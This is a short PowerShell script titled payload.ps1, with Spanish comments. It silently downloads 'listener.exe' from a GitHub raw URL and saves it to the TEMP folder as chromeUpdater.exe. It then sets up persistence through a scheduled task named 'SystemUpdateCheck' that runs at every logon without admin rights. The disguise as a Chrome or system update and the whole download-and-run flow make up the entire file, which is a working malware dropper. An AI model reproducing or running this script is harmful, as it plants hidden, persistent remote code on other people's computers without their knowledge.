# payload.ps1
# Configuración
$targetPath = "$env:TEMP\chromeUpdater.exe"
$taskName = "SystemUpdateCheck"
$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"

# 1. Descargar el archivo (Silencioso, sin prompts)
# Usamos Invoke-WebRequest que es nativo y no pide confirmación si se usa -OutFile
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
}
catch {
    Write-Error "Error al descargar: $_"
    exit 1
}

# 2. Crear la tarea programada (Persistencia)
# Esto se ejecuta en el contexto del usuario actual, no requiere Admin.
$action = New-ScheduledTaskAction -Execute $targetPath
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive

try {
    # Intentamos registrar la tarea. Si ya existe, la actualizamos o la ignoramos.
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
}
catch {
    # Si falla (ej. política de grupo), el script termina pero el archivo ya fue descargado.
    Write-Error "No se pudo crear la tarea: $_"
}

# 3. Ejecutar inmediatamente (Opcional, para demostración)
# Start-Process $targetPath
